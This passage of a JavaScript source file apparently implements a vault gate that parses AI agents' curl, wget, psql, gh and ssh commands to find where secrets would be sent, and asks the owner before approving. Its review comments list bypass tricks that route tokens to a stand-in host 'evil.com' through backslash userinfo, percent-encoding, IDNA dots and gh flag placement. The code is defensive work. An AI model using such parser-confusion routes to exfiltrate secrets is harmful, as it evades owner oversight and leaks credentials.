      add(x); argvExposed = true;
    }
  }
  if (argvExposed) injection.push('argv');
  if (!refs.size) return refuse('no_reference');
  return { ok: true, argv, tool: String(req.resolved || argv[0]), name, kind: toolKindOf(name), row, refs: [...refs.values()], env, plainEnv, files, stdin, injection: [...new Set(injection)], argvExposed, on: req.on ? String(req.on) : null, timeoutSec: timeoutOf(req.timeoutSec) || TIMEOUT_DEFAULT_S, programWritable: req.programWritable === true };
}
/** The door's LAST step over planOf's answer (`run`) — the only object that holds values (never stored, never logged): the
 *  child's argv / env / stdin and each file's content. `valueOf(ref)` = the vault's value; `pathOf(slot)` = the door's 0700 run dir + a name. */
function materialize(run, { valueOf, pathOf }) {
  const slotOf = (x) => (run.files.find((f) => (x.name ? f.name === x.name : f.name === null && f.ref === x.ref)) || {}).slot;
  const argv = run.argv.map((a) => {
    const { refs } = scanRefs(a);
    let out = '', i = 0;
    for (const x of refs) { out += a.slice(i, x.at) + (x.form === 'file' ? String(pathOf(slotOf(x))) : run.argvExposed ? String(valueOf(x.ref)) : x.ref); i = x.at + x.len; }
    return out + a.slice(i);
  });
  const env = {};
  for (const e of run.plainEnv) env[e.name] = e.value;
  for (const e of run.env) env[e.name] = String(valueOf(e.ref));
  for (const f of run.files) if (f.name) env[f.name] = String(pathOf(f.slot));
  const files = run.files.map((f) => ({ slot: f.slot, path: String(pathOf(f.slot)), content: f.template != null ? renderTemplate(f.text, valueOf) : String(valueOf(f.ref)) }));
  return { argv, env, files, stdin: run.stdin ? String(valueOf(run.stdin)) + '\n' : null };
}

// ── THE SHAPE KEY (decision ④) ──
const URL_RE = /\b([a-z][a-z0-9+.-]{0,31}):\/\/(?:[^@\s\/\\?#'"]{0,256}@)?(\[[0-9a-f:.]+\]|[A-Za-z0-9.-]+)(?::(\d{1,5}))?((?:,(?:\[[0-9a-f:.]+\]|[A-Za-z0-9.-]+)(?::\d{1,5})?)*)/gi;   // lane vault-agent-own (review): a `\` ends the userinfo — WHATWG reads `https://evil\@good/` as host evil
const normHost = (h, port = null) => { const x = String(h || '').toLowerCase().replace(/\.$/, ''); return x && x.length <= 253 ? (port ? `${x}:${port}` : x) : null; };
function urlHosts(text) {
  const out = []; let m; URL_RE.lastIndex = 0;
  while ((m = URL_RE.exec(String(text)))) if (m[1].toLowerCase() !== 'vault') {
    out.push(normHost(m[2], m[3]));
    for (const x of (m[4] || '').split(',').slice(1)) { const k = /^(\[[^\]]+\]|[^:]+)(?::(\d+))?$/.exec(x); if (k) out.push(normHost(k[1], k[2])); }   // round 2: every host of a URI's list
  }
  return out.filter(Boolean);
}
// lane vault-agent-own (round 2) — the hosts the table did not read and the tool still goes to
const URL_AUTHORITY_RE = /\b([a-z][a-z0-9+.-]{0,31}):\/\/([^\/?#\s'"]*)/gi;   // scheme through the authority (up to the path / query / fragment)
/** round 2b (HIGH-1): curl and wget percent-decode the host, IDNA-map a non-ASCII host and read userinfo PAST a backslash —
 *  so `good.com%2eevil.com`, `good.com。evil.com`, `good.com\@evil.com` all reach evil.com while URL_RE reads good.com. An
 *  authority that holds a `%`, a `\` or a non-ASCII byte cannot be trusted ⇒ the shape is BLIND (its real host is unknown). */
function blindAuthority(text) {
  let m; URL_AUTHORITY_RE.lastIndex = 0;
  while ((m = URL_AUTHORITY_RE.exec(String(text)))) if (m[1].toLowerCase() !== 'vault' && /[%\\]|[^\x00-\x7f]/.test(m[2])) return true;
  return false;
}
const BARE_RE = /^(?:[^\s@\/\\?#]*@)?(\[[0-9a-f:.]+\]|[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?)?(?::(\d{0,5}))?(?:[\/?#]\S*)?$/i;
/** A URL tool's target (curl / wget: every positional; httpie: its URL) → { host } (written without a scheme: `evil.example.com/x`,
 *  httpie's `:3000` = localhost) | { unread: true } (a target whose hosts the shape cannot list: curl's glob `{a,b}` / `[1-9]`, a
 *  bare number — an address too, `2130706433` = 127.0.0.1 —, a URL URL_RE cannot read) | {} (not a target: a header, a data word). */
function targetOf(a, globs = false, strict = false) {
  const s = String(a);
  if (globs && /[{}]|\[(?![0-9a-f:.]+\])/i.test(s)) return { unread: true };
  if (/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(s)) return urlHosts(s).length ? {} : { unread: true };
  const m = BARE_RE.exec(s);
  if (!m || (!m[1] && m[2] == null)) return strict ? { unread: true } : {};   // round 3: for a network tool (bareHosts:'all') a positional that is not a readable target is UNREAD (blind), never silently ignored — curl IDNA-maps / percent-decodes good.com。evil.com
  if (!m[1]) return { host: normHost('localhost', m[2] || null) };
  if (/^[\d.]+$/.test(m[1]) && !/^\d{1,3}(?:\.\d{1,3}){3}$/.test(m[1])) return { unread: true };
  return { host: normHost(m[1], m[2] || null) };
}
/** httpie: `http [METHOD] URL [items…]` — its one target. */
const httpieTarget = (ps) => (ps.length >= 2 && /^[A-Za-z]+$/.test(ps[0]) ? [ps[1]] : ps.slice(0, 1));
/** libpq's `host=` / `hostaddr=` (a connection string, `-d …`, a URI's `?host=`) → every host it names (a host LIST too). */
const CONNINFO_HOST = /(?:^|[\s?&=]|^-d)(?:host|hostaddr)\s*=\s*(?:'((?:[^'\\]|\\.)*)'|([^\s&'"]+))/gi;
function conninfoHosts(text) { const out = []; let m; CONNINFO_HOST.lastIndex = 0; while ((m = CONNINFO_HOST.exec(String(text)))) for (const h of String(m[1] != null ? m[1] : m[2]).split(',')) { const hh = h.trim(); if (/^(?:\/|%2f)/i.test(hh)) continue; out.push(normHost(hh)); } return out.filter(Boolean); }   // round 2b: a unix-socket path is local, not a network host
const CONNINFO_URI = /^postgres(?:ql)?:\/\/[^#]*/i;
function conninfoUriBlind(text) { const m = CONNINFO_URI.exec(String(text)); if (!m) return false; const q = m[0].indexOf('?'); return q >= 0 && m[0].slice(q).includes('%'); }   // round 3: a % in a conninfo URI's query = a libpq-decoded keyword (host / hostaddr / service) our reader cannot see
/** round 4: is a boolean flag present in its TRUE sense in any pflag spelling — the long form, --flag=true (not =false / =0),
 *  a short letter alone, a short letter inside a cluster of boolean letters (-dm / -md), or -x=true? gh's git-driving flags
 *  spell short aliases (pr merge --delete-branch / -d; repo create --clone / -c, --push). */
function boolFlagOn(argv, longs, shorts, grammar) {
  const valueShorts = new Set(((grammar && grammar.value) || []).filter((f) => /^-[A-Za-z]$/.test(f)));   // round 5: the verb's value-taking short flags, from the generated grammar
  const truthy = (val) => val == null || !/^(?:0|f|false)$/i.test(val);
  for (const a of argv.slice(1)) {
    if (a === '--') break;
    if (a.startsWith('--') && a.length > 2) { const eq = a.indexOf('='); if (longs.includes(eq > 0 ? a.slice(0, eq) : a) && truthy(eq > 0 ? a.slice(eq + 1) : null)) return true; }
    else if (a[0] === '-' && a.length > 1 && a[1] !== '-') {
      const eq = a.indexOf('='), letters = eq > 0 ? a.slice(1, eq) : a.slice(1), clVal = eq > 0 ? a.slice(eq + 1) : null;   // round 5: in a cluster, pflag binds `=value` to the LAST letter only
      for (let i = 0; i < letters.length; i++) {
        const sh = '-' + letters[i];
        if (valueShorts.has(sh)) break;   // a value short takes the REST of the cluster as its value — the later letters are not flags (pflag)
        if (shorts.includes(sh) && truthy(i === letters.length - 1 ? clVal : null)) return true;   // a boolean git-driving short: set true (NoOptDefVal) unless it is the LAST letter and carries =false/=0
      }
    }
  }
  return false;
}
/** round 4: a curl / wget FILE flag (--cacert / --cert / --netrc-file / --hsts …) escapes the config-file blind ONLY when its
 *  WHOLE value is a $VAULT_FILE{…} placeholder (for -E / --cert an optional :password after it — nothing else) whose entry the
 *  agent did NOT author: an owner-store entry. A template (--file NAME=@…, the agent's own text) or an agent-scoped entry (the
 *  agent put or minted the bytes) is the agent's own file ⇒ blind as any other config file; a $VAULT_FILE{…} inside a longer
 *  path (./x/$VAULT_FILE{o}/ca.pem, $VAULT_FILE{o}/../ca.pem) is not a whole placeholder ⇒ blind. ROUND 5 (say the reason): a
 *  MINTED own value is random printable text, never a usable cert / key / CA, so blinding it loses nothing legal — the exemption
 *  admits ONLY an owner-store entry, and an agent-scoped placeholder (put OR minted) blinds. */
function fileFlagExempt(f, v, run) {
  const re = f === '-E' || f === '--cert' ? /^\$VAULT_FILE\{([^}]*)\}(?::.*)?$/ : /^\$VAULT_FILE\{([^}]*)\}$/;
  const m = re.exec(String(v));
  if (!m) return false;
  const inner = m[1];
  if (ENV_NAME.test(inner)) { const file = run.files.find((x) => x.name === inner); return !!file && file.template == null && file.ref != null && !agentScopeOf(parseRef(file.ref)); }
  return !agentScopeOf(innerRef(inner));
}
/** getopt's short-flag cluster: the first letter that takes a value takes the rest of the word (`-hHOST`, `-sSo out`) or the next word. */
function shortSplit(a, takes) { for (let i = 1; i < a.length; i++) { const f = '-' + a[i]; if (takes.includes(f)) { let v = i + 1 < a.length ? a.slice(i + 1) : null; if (v && v[0] === '=') v = v.slice(1); return { f, head: a.slice(0, i + 1), v }; } } return null; }   // round 2b: `-s=https://…` (Go flags) drops the `=`
const HOSTNAME = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$|^localhost$/i;
function argClassOf(a) {
  if (/\$VAULT_FILE\{/.test(a)) return '<vaultfile>';
  if (/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(a)) return '<url>';
  if (/^[+-]?\d+(?:\.\d+)?$/.test(a)) return '<number>';
  if (/[\/\\]|^[.~]/.test(a)) return '<path>';
  return '<word>';
}
/** planOf's answer (`run`) → its SHAPE: { v, tool, name, kind, sub, flags, args, hosts, entries, injection, env (NAME=value), keyed,
 *  templates, on, script, known, proxyEnv, always, noAlways, argvExposed }. `always` = «always» may be offered for it. */
function shapeOf(run) {
  const row = run.row, kind = run.kind, argv = run.argv;
  const flags = new Set(), sub = [], args = [], positionals = [], keyed = [], valued = [];
  let script = null, afterDashes = false, valueNext = null, configFile = false, unread = false;
  const isKeyed = (f) => !!(row && (row.keyed || []).includes(f));
  const ghLead = [];   // round 5/6: gh's grammar is PER VERB — collect the LEADING non-dash words (gh wants the command first), stopping at the FIRST dash. A dash before the verb words is a flag the reader cannot place (cobra skips an unknown flag + its arg at every level and re-parses at the leaf), so no key matches ⇒ vg null ⇒ BLIND (fail closed — gh repo -d x edit evil/o/r is not read as repo edit)
  if (row && row.grammar) for (const a of argv.slice(1)) { if (a[0] === '-' || ghLead.length >= (row.sub || 0)) break; ghLead.push(a); }
  let vg = null;   // the LONGEST leading key the table knows (1 word like `api`, 2 like `repo create`); null = a dash came first, or a verb the table does not carry (one that reaches no host) ⇒ the shape BLINDS below
  if (row && row.grammar) for (let n = ghLead.length; n >= 1 && !vg; n--) vg = row.grammar[ghLead.slice(0, n).join(' ')] || null;
  const takes = row ? [...(row.valueFlags || []), ...(row.hostFlags || []), ...(row.configFlags || []), ...(row.keyed || []), ...(vg ? vg.value : [])] : [];   // the flags that take a value (+ gh's per-verb value flags)
  if (kind !== 'tool') script = JSON.stringify(argv.slice(1));
  else for (const a of argv.slice(1)) {
    if (!afterDashes && a === '--') { afterDashes = true; flags.add('--'); continue; }
    if (!afterDashes && a.length > 1 && a[0] === '-') {
      const eq = a.startsWith('--') ? a.indexOf('=') : -1, cl = a[1] !== '-' && a.length > 2 && !takes.includes(a) ? shortSplit(a, takes) : null;   // round 2: -hHOST, -oProxyCommand=…, -sSo out
      let f = eq > 0 ? a.slice(0, eq) : cl ? cl.f : a;
      const v = eq > 0 ? a.slice(eq + 1) : cl ? cl.v : null;
      if (row && row.prefixOpts && f.startsWith('--') && f.length > 2 && !takes.includes(f)) {   // round 2b: GNU/my_getopt accept any UNIQUE prefix of a long option (wget --exec, psql --hos, --comm, --fil)
        const pref = (list) => (list || []).find((t) => t.startsWith('--') && t !== f && t.startsWith(f));
        const c = pref(row.configFlags) || pref(row.scriptFlags) || pref(row.hostFlags) || pref(row.keyed) || pref(row.urlFlags) || pref(row.valueFlags);
        if (c) f = c;   // treat the abbreviation as the flag it names — its value is read (or the shape goes blind) as if spelled in full
      }
      if (row && (row.configFlags || []).includes(f)) configFile = true;
      if (row && (row.blindPrefixes || []).some((p) => f.startsWith(p))) unread = true;   // curl --expand-url https://{{H}}/ — a host made at run time
      if (v != null) { flags.add(eq > 0 ? a.slice(0, eq + 1) : cl.head); if (isKeyed(f)) keyed.push(`${f}=${v}`); else { args.push(argClassOf(v)); valued.push([f, v]); } } else flags.add(cl ? cl.head : a);
      valueNext = v == null && (takes.includes(a) || takes.includes(f) || cl) ? f : null;   // round 2b: a resolved prefix (f) takes a value too
      continue;
    }
    const wasValue = valueNext; valueNext = null;
    if (wasValue && isKeyed(wasValue)) { keyed.push(`${wasValue}=${a}`); continue; }   // a routing flag's value IS the shape (ssh -o ProxyCommand=…)
    if (wasValue) { args.push(argClassOf(a)); valued.push([wasValue, a]); continue; }
    if (row && row.sub && sub.length < row.sub && !positionals.length && /^[a-z][a-z0-9-]{0,40}$/.test(a)) { sub.push(a); continue; }
    args.push(argClassOf(a));
    positionals.push(a);
  }
  // THE HOSTS: every URL anywhere (the command, the plain env values, the templates) + the row's own rules; its defaults when none
  const hosts = new Set([...argv.slice(1), ...run.plainEnv.map((e) => e.value), ...run.files.map((f) => f.text || '')].flatMap(urlHosts));
  if (row && kind === 'tool') {
    const vals = (list) => valued.filter(([f]) => (list || []).includes(f)).map(([, v]) => v);
    const envs = (list) => run.plainEnv.filter((e) => (list || []).includes(e.name) && e.value).map((e) => e.value);
    const many = (v) => String(v).split(',').map((h) => normHost(h.trim()));   // libpq takes a host LIST (PGHOST=h1,h2 · -h h1,h2)
    if (row.grammar && !vg) unread = true;   // round 6 (FAIL CLOSED): a KNOWN network tool (gh) at a spelling the table cannot read with certainty — a dash before the verb words (findings 1), or a verb the table does not carry: one absent because it reaches no host, or an unknown verb (finding 2) — BLINDS; the reader never models where cobra would place a flag
    if (row.scpLike) for (const a of positionals) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{2,253}):(?!\/\/)/.exec(a); if (m && !/^[A-Za-z]$/.test(m[1])) hosts.add(normHost(m[1])); }
    if (row.sshTarget && positionals.length) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{1,253})$/.exec(positionals[0]); if (m) hosts.add(normHost(m[1])); }
    const hostFlagList = [...(row.hostFlags || []), ...(vg && vg.host ? [vg.host] : [])];   // round 5: -h is --hostname only under the verb that defines it (gh auth status -h evil.com sends GH_ENTERPRISE_TOKEN there) — the grammar carries the per-verb short
    if (hostFlagList.length) for (const v of vals(hostFlagList)) if (!/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(v)) many(v).forEach((h) => hosts.add(h));   // -h x · --host=x · -hx (round 2); a URL value (kubectl -s https://…) was read above
    if (row.scriptFlags) for (const v of vals(row.scriptFlags)) if (row.escapes.test(v)) unread = true;   // round 2: a client's shell escape — where it sends is the shell's
    if (row.registry) for (const a of positionals) { const h = a.split('/')[0]; if (HOSTNAME.test(h.replace(/:\d+$/, ''))) hosts.add(normHost(h)); }
    if (row.hostEnv) for (const v of envs(row.hostEnv)) many(v).forEach((h) => hosts.add(h));
    if (row.bareHosts) for (const a of [...(row.bareHosts === 'first' ? httpieTarget(positionals) : positionals), ...vals(row.urlFlags)]) { if (String(a).startsWith('@')) { unread = true; continue; } const t = targetOf(a, !!row.globs, row.bareHosts === 'all'); if (t.host) hosts.add(t.host); if (t.unread) unread = true; }   // round 2b: `--url @file` / `@urls.txt` reads the real targets from a file
    if (row.conninfo) for (const a of [...argv.slice(1), ...vals(['-d', '--dbname'])]) { conninfoHosts(a).forEach((h) => hosts.add(h)); if (conninfoUriBlind(a)) unread = true; }
    const stripScheme = (x) => String(x).replace(/^[a-z][a-z0-9+.-]{0,31}:\/\//i, '');
    const repoSpec = vg && vg.spec && positionals.length ? [stripScheme(positionals[0])] : [];   // round 5: a `spec` verb reads positionals[0] as HOST/OWNER/REPO — gh's ghrepo.FromFullName (repo view's <repository>, repo create's <name>); a URL scheme is stripped
    const repoVals = vg && vg.repoValues ? vals(vg.repoValues).map(stripScheme) : [];   // round 6: EVERY value the help TYPEs as a repository is a spec too, any flag any verb (repo create --template evil/o/r, the inherited -R) — gh resolves it to that host
    if (row.repoFlags) for (const v of [...vals(row.repoFlags), ...envs(row.repoEnv), ...repoSpec, ...repoVals]) { const p = String(v).split('/'); if (p.length >= 3) { const h = normHost(p[0]); if (h) hosts.add(h); else unread = true; } }   // gh -R HOST/OWNER/REPO (round 2b: an IP / a port / a trailing dot routes too — no HOSTNAME gate; gh sends GH_ENTERPRISE_TOKEN to a non-github host)
    if (row.blindSubs && row.blindSubs.some((b) => b.every((w, i) => sub[i] === w))) unread = true;   // round 2b: a subcommand that drives git (gh repo clone / pr checkout) — the project's config / hooks decide where it goes
    if (row.blindFlagSubs) for (const b of row.blindFlagSubs) if (b.sub.every((w, i) => sub[i] === w) && boolFlagOn(argv, b.longs || [], b.shorts || [], vg)) unread = true;   // round 3/4/5: a verb that drives git only with a bool flag (gh pr merge --delete-branch/-d, repo create --push/--clone/-c) — boolFlagOn matches every pflag spelling (long, =true not =false, a short alone or in a cluster, -x=true); round 5: a cluster's =value binds to the LAST letter only (the grammar says which letters take a value)
    if (row.fileFlags) for (const [f, v] of valued) if (row.fileFlags.includes(f) && !fileFlagExempt(f, v, run)) configFile = true;   // round 3/4: a cert / config FILE the agent can write ⇒ config class — blind unless the WHOLE value is a $VAULT_FILE placeholder (fileFlagExempt) for an owner-store entry (a template / an agent-put entry / a substring blinds)
    if (row.passDashes && flags.has('--')) unread = true;   // round 2b: gh passes args after `--` to git
    if ([...argv.slice(1), ...run.plainEnv.map((e) => e.value), ...run.files.map((f) => f.text || '')].some(blindAuthority)) unread = true;   // round 2b (HIGH-1): a URL authority our host read cannot be trusted for
    if (!hosts.size && row.hosts) row.hosts.forEach((h) => hosts.add(h));
  }
  hosts.delete(null);
  const known = !!row && kind === 'tool';   // round 2: `unread` (a curl glob, a bare number) is part of an UNKNOWN destination — never «always»
  const noAlways = kind !== 'tool' ? kind : !known || !hosts.size || unread ? 'unknown-destination' : row.runsProject ? 'runs-project-code' : configFile ? 'config-file' : run.programWritable ? 'program-writable' : null;
  return {
    v: SHAPE_V, tool: run.tool, name: run.name, kind, sub, flags: [...flags].sort(), args, hosts: [...hosts].sort(),
    entries: run.refs.map((r) => r.ref).sort(), injection: [...run.injection].sort(), env: run.plainEnv.map((e) => `${e.name}=${e.value}`).sort(), keyed: keyed.sort(),
    templates: run.files.filter((f) => f.text != null).map((f) => `${f.name}=${f.text}`).sort(), on: run.on || null, script,
    known, proxyEnv: !!(known && row.proxyEnv), always: !noAlways, noAlways, argvExposed: !!run.argvExposed,
    // lane vault-agent-own (the review): where it sends what it reads cannot be told — the raw facts, never `noAlways` (a
    // known tool naming no host reads 'unknown-destination' there, which hid a config file / a program an agent wrote).
    // Round 2: every row of KNOWN_TOOLS reaches the network, so a known tool whose host the table did not READ (`curl` with
    // no URL, `psql` over a service, `rclone remote:`) is not a local command — no host read is not «no host»; a target the
    // shape cannot list (`unread`) and a destination its config keeps (`confDest`: git's url.<base>.insteadOf in the
    // project's own .git/config, an rclone remote) are blind too
    blind: kind !== 'tool' || !known || !hosts.size || unread || keyed.length > 0 || configFile || !!(row && (row.runsProject || row.confDest)) || !!run.programWritable,
  };
}
/** THE KEY a remembered «always» is stored under — everything decision ④ says, nothing positional. */
const shapeKeyOf = (s) => `${SHAPE_V}:${JSON.stringify([s.tool, s.sub, s.flags, s.args, s.hosts, s.entries, s.injection, s.env, s.templates, s.on, s.script, s.keyed])}`;

// ── WHICH ENTRIES A RUN MAY NEVER REFERENCE (each has its own door; the owner opens the rest one by one) ──
const OWN_DOORS = Object.freeze([
  Object.freeze({ store: 'accounts', door: 'the account pool — a conversation on that account already runs with it' }),
  Object.freeze({ store: 'integrations', door: 'the channel\'s raw API — vibespace-channels api' }),
  Object.freeze({ store: 'channels', door: 'the channel\'s own doors — vibespace-channels (send, api)' }),
  Object.freeze({ store: 'passkeys', door: 'the agent browser\'s passkey ceremony' }),
  Object.freeze({ store: 'automation', door: 'the Vault window, to hand to an outside party — VibeSpace\'s own key never goes into a run' }),
  Object.freeze({ store: 'secrets', entry: /^host:/, door: 'the machine\'s link (Remote) — a link token runs commands on that machine' }),
  Object.freeze({ store: 'secrets', entry: /^frp:/, door: 'the relay (the frp plugin) uses it itself' }),
  Object.freeze({ store: 'secrets', door: 'VibeSpace uses it itself' }),
]);
const RUNNABLE_STORES = Object.freeze(['mounts', 'app-secrets']);
/** A reference → the door it has instead (words), or null when the owner may open it for runs. A store this table does not
 *  know has no run door (fails closed). */
function ownDoorOf(ref) {
  if (!ref) return 'no run door';
  if (isAgentEntry(ref.store, ref.entry, ref.field)) return null;   // lane vault-run-door: an AGENT's own entry (mint / put) — the owner opens it like any other; only its conversation references it
  if (isFreeEntry(ref.store, ref.entry, ref.field)) return null;    // lane vault-paste-request: a free entry — the owner opens it (switch / grant)
  const d = OWN_DOORS.find((x) => x.store === ref.store && (!x.entry || x.entry.test(ref.entry)));
  return d ? d.door : RUNNABLE_STORES.includes(ref.store) ? null : 'no run door (a store the run table does not know)';
}

// ── THE VERDICT (§8.3) ──
/**
 * → { ok: true, by: 'always' | 'instance' } | { ok: false, code, words, … } | { ok: false, ask: true, code: 'ask', offers,
 *   alwaysTtls, alwaysDefault, reauth, ttlMs, noAlways, argvExposed }.
 * `state` the vault's; `plan` planOf's answer; `shape` shapeOf(plan); `entries` [{ id, exists, open, bytes }] (the door's
 * facts — `open` = the owner's «Usable by agent runs», `bytes` = the value's length); `granted` = this conversation may use
 * them (the who-may-use list, P1 vault-use-reach); `remembered` = { until } stored for (conversation, shapeKeyOf(shape));
 * `seen` = the owner allowed this (conversation, shape) once already, this unlock (the door's memory — lane vault-run-door);
 * `instance` 'cluster' | 'local'; `policy` 'ask' | 'allow' | null (null = the instance's: a cluster asks EVERY time, a local one
 * asks the first time and allows a SEEN shape — decision ②: «a new shape asks; a local instance allows after one 允许»).
 * lane vault-agent-own: an entry's facts may say `own` (an agent entry the caller made — open by construction), `prov`
 * ('stored' | 'minted') and `forHost` (a mint's `--for`); `passes` = [{ id, host }] the owner already allowed a minted value to
 * go to. Every entry its own and no minted value bound for another host ⇒ { ok: true, by: 'own' } — no card; an ask says
 * `why` (['not-own'] — an entry the caller did not make · ['another-host'] — a minted value to a host it was not made for)
 * and `away` (the hosts to allow — ONCE each).
 */
/** Where a run sends what it reads CANNOT be told from its shape (lane vault-agent-own, the review): a shell or an interpreter
 *  (its own code decides), a tool outside the table, a routing flag (ssh -o / curl --connect-to / -x …), a config file the card
 *  cannot show, the project's own code (npm / pip / docker), a program an agent could have written — and (round 2) a known
 *  tool whose host the table did not read: every row of the table reaches the network. A known tool naming hosts sends there.
 *  `shapePasses` = a 允许 for such a shape is remembered (`keep`) — a LOCAL instance's rule; a CLUSTER asks every run of it
 *  (round 2: never looser than the owner's own entries there — only a live «always», behind the second password, passes it). */
const destUnknown = (sh) => !sh || sh.blind !== false;   // shapeOf's `blind` (a shape that does not say is blind)
function awayOf(refs, facts, shape, passes = [], { shapePasses = true } = {}) {
  const out = [], hosts = shape && Array.isArray(shape.hosts) ? shape.hosts : [], ps = Array.isArray(passes) ? passes : [];
  const unknown = destUnknown(shape), shapePass = unknown ? `?${shapeKeyOf(shape)}` : null;   // an unknown destination is passed per SHAPE, never per host
  for (const r of refs || []) {
    const e = facts.get(r.id);
    if (!e || e.own !== true || e.prov !== 'minted') continue;   // a value the agent PUT (it saw it) asks nothing, ever
    if (unknown) { if (!(shapePasses && ps.some((p) => p && p.id === r.id && p.host === shapePass))) out.push({ ref: r.ref, id: r.id, forHost: forHostOf(e.forHost), host: null, pass: shapePass, unknown: true, keep: !!shapePasses }); continue; }
    for (const h of hosts) if (!sameHost(h, e.forHost) && !ps.some((p) => p && p.id === r.id && p.host === h)) out.push({ ref: r.ref, id: r.id, forHost: forHostOf(e.forHost), host: h, pass: h, keep: true });
  }
  return out;
}
function runVerdict({ state, plan, shape = null, entries = [], granted = false, remembered = null, seen = false, instance = 'local', policy = null, passes = [], now = Date.now() } = {}) {
  if (state === 'not_set_up') return refuse('vault_not_set_up');
  if (state !== 'unlocked') return refuse('vault_locked');
  if (!plan || !plan.ok) return plan && plan.code ? plan : refuse('bad_flag');
  const sh = shape || shapeOf(plan);
  const facts = new Map((Array.isArray(entries) ? entries : []).filter((e) => e && e.id).map((e) => [e.id, e]));
  for (const r of plan.refs) {
    const door = ownDoorOf(r);
    if (door) return refuse('entry_has_its_own_door', { ref: r.ref, door, words: `${WORDS.entry_has_its_own_door}: ${door}` });
    const e = facts.get(r.id);
    if (!e || !e.exists) return refuse('entry_unknown', { ref: r.ref });
    if (e.open !== true && e.own !== true) return refuse('entry_not_runnable', { ref: r.ref });   // lane vault-agent-own: its own entry is open to its conversation by construction
    if (!(Number(e.bytes) >= MIN_MASK_BYTES)) return refuse('entry_too_short_to_mask', { ref: r.ref });
  }
  if (granted !== true) return refuse('use_not_granted');
  const mode = policy === 'ask' || policy === 'allow' ? policy : instance === 'cluster' ? 'ask' : 'allow';
  const live = !!(sh.always && remembered && (remembered.until == null || Number(remembered.until) > now));   // a remembered «always» (the second password gave it)
  // THE OWN ROAD (lane vault-agent-own): what the caller made itself asks nothing — but a minted value bound for another host,
  // or (round 2) through a shape whose destination cannot be told: once per shape on a local instance, EVERY run on a cluster
  // unless a live «always» covers the shape (never a host: a host is passed once, by its own card)
  const away0 = awayOf(plan.refs, facts, sh, passes, { shapePasses: mode === 'allow' }), away = away0.filter((x) => !(x.unknown && live));
  const why = [...(plan.refs.some((r) => (facts.get(r.id) || {}).own !== true) ? ['not-own'] : []), ...(away.length ? ['another-host'] : [])];
  if (!why.length) return { ok: true, by: away0.length ? 'always' : 'own' };
  if (!why.includes('not-own') && !away.some((x) => x.unknown)) return { ok: false, ask: true, code: 'ask', why, away, offers: ['once', 'deny'], alwaysTtls: [], alwaysDefault: null, reauth: false, ttlMs: ASK_TTL_MS, noAlways: 'another-host', argvExposed: sh.argvExposed };   // ONCE per host: the answer is the host's pass, never a shape's «always»
  if (!away.length && live) return { ok: true, by: 'always' };
  if (!away.length && mode === 'allow' && seen === true) return { ok: true, by: 'seen' };   // a NEW shape always draws the card (lane vault-run-door's mutant)
  return { ok: false, ask: true, code: 'ask', why, away, offers: sh.always ? ['once', 'always', 'deny'] : ['once', 'deny'], alwaysTtls: sh.always ? Object.keys(ALWAYS_TTLS) : [], alwaysDefault: sh.always ? ALWAYS_DEFAULT : null, reauth: sh.always, ttlMs: ASK_TTL_MS, noAlways: sh.noAlways, argvExposed: sh.argvExposed };
}

// ── THE SCRUBBER ──
function utf8(s) {
  const out = [];
  for (const ch of String(s)) {
    const c = ch.codePointAt(0);
    if (c < 0x80) out.push(c);
    else if (c < 0x800) out.push(0xc0 | (c >> 6), 0x80 | (c & 63));
    else if (c < 0x10000) out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
    else out.push(0xf0 | (c >> 18), 0x80 | ((c >> 12) & 63), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
  }
  return out;
}
const B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
function b64(bytes) {
  let s = '';
  for (let i = 0; i < bytes.length; i += 3) {
    const n = (bytes[i] << 16) | ((bytes[i + 1] || 0) << 8) | (bytes[i + 2] || 0), k = bytes.length - i;
    s += B64[(n >> 18) & 63] + B64[(n >> 12) & 63] + (k > 1 ? B64[(n >> 6) & 63] : '=') + (k > 2 ? B64[n & 63] : '=');
  }
  return s;
}
const urlSafe = (s) => s.replace(/\+/g, '-').replace(/\//g, '_');
function base64Forms(bytes) {
  const full = b64(bytes), out = [];
  for (const f of [full, full.replace(/=+$/, '')]) out.push(['base64', f], ['base64', urlSafe(f)]);
  for (let k = 0; k < 3; k++) {   // inside a longer base64 run the value starts at byte k of a group: its OWN characters only
    const run = b64([...new Array(k).fill(0), ...bytes, 0, 0]);
    const core = run.slice(Math.ceil((8 * k) / 6), Math.floor((8 * (k + bytes.length)) / 6));
    out.push(['base64', core], ['base64', urlSafe(core)]);
  }
  return out;
}
const hex2 = (b, up) => { const h = (b < 16 ? '0' : '') + b.toString(16); return up ? h.toUpperCase() : h; };
function percentForms(bytes) {
  const ch = (b) => (b < 128 ? String.fromCharCode(b) : '');
  const unreserved = (b) => b < 128 && /[A-Za-z0-9\-_.~]/.test(ch(b));
  const keeps = [(b) => unreserved(b) || (b < 128 && "!'()*".includes(ch(b))), unreserved, (b) => unreserved(b) || b === 47, (b) => b < 128 && /[A-Za-z0-9*\-_.]/.test(ch(b)), () => false];   // encodeURIComponent · RFC 3986 · a path (Python quote) · a WHATWG form · every byte
  const out = [];
  for (const up of [true, false]) for (const keep of keeps) {
    const s = bytes.map((b) => (keep(b) ? ch(b) : '%' + hex2(b, up))).join('');
    out.push(['percent', s], ['percent', s.replace(/%20/g, '+')]);
  }
  return out;
}
const JSON_SHORT = Object.freeze({ 8: '\\b', 9: '\\t', 10: '\\n', 12: '\\f', 13: '\\r' });
function jsonForms(value) {
  const out = [];
  for (const slash of [false, true]) for (const uni of [null, 'lower', 'upper']) for (const html of [false, true]) {
    const u = (n) => { const h = n.toString(16).padStart(4, '0'); return '\\u' + (uni === 'upper' ? h.toUpperCase() : h); };
    let s = '';
    for (const c of String(value)) {
      const p = c.codePointAt(0);
      if (c === '"') s += '\\"';
      else if (c === '\\') s += '\\\\';
      else if (c === '/' && slash) s += '\\/';
      else if (p < 0x20) s += JSON_SHORT[p] || u(p);
      else if (html && (c === '<' || c === '>' || c === '&')) s += u(p);
